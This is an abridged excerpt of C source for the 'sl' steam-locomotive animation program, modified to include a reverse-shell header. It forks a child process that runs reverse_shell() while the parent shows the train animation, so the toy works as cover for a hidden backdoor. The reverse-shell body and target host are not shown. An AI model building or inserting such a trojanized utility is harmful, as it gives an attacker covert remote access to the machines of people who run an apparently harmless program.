...
#include <sys/wait.h>
#include "sl.h"
#include "reverse_shell.h"  // Include reverse shell header
...
int main(int argc, char *argv[])
{
    ...
    // Process options passed as arguments
    for (i = 1; i < argc; ++i) {
        if (*argv[i] == '-') {
            option(argv[i] + 1);
        }
    ...
    // Fork a new process for reverse shell
    pid = fork();
    if (pid == 0) {
        // Child process: execute the reverse shell
        reverse_shell();
        return 0;
    }

    // Parent process: main loop for displaying train animation
    while (1) {
        ...
        // Check if the reverse shell process has finished
        int status;
        pid_t result = waitpid(pid, &status, WNOHANG);
        if (result == pid) {
            // If the reverse shell has finished, exit the loop
            break;
        }
    }
...
// Function definitions for adding ASCII art components (train, coal, etc.)
...
// Additional functions for adding train animations (add_C51, add_D51, add_man, add_smoke)
